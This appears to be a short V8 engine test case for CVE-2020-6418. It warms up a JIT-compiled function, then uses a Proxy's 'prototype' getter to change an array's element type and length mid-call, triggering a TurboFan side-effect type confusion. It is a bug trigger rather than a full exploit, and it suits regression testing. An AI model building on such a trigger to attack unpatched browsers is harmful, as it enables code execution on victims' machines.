// v8: CVE-2020-6418 (TurboFan JSCreate side effect: Reflect.construct with a Proxy new.target) jit-sideeffect
var arr = [1.1, 2.2, 3.3];
function hot(a, nt) { a[0]; Reflect.construct(function () {}, [], nt); return a[0]; }
for (var i = 0; i < 300; i++) hot(arr, Object);
var pt = new Proxy(Object, { get(t, k) { if (k === 'prototype') { arr[0] = {}; arr.length = 1; } return Reflect.get(t, k); } });
print(typeof hot(arr, pt), arr.length);
